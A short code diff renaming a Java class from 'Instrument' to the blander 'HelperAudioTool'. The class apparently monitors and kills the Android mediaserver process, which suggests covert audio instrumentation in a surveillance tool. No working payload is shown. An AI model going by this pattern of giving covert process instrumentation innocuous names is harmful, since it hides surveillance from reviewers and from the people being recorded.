@@ -20,8 +20,8 @@ import com.android.dvci.file.AutoFile;
 
 import com.android.mm.M;
 
-public class Instrument {
-	private static final String TAG = "Instrument";
+public class HelperAudioTool {
+	private static final String TAG = "HelperAudioTool";
 	private static final int MAX_KILLED = 3;
 	private String proc;
 	private MediaserverMonitor pidMonitor;
@@ -31,7 +31,7 @@ public class Instrument {
 	private Thread monitor;
 	private int killed = 0;
 
-	public Instrument(String process, String dump) {
+	public HelperAudioTool(String process, String dump) {
 		final File filesPath = Status.getAppContext().getFilesDir();
 
 		proc = process;
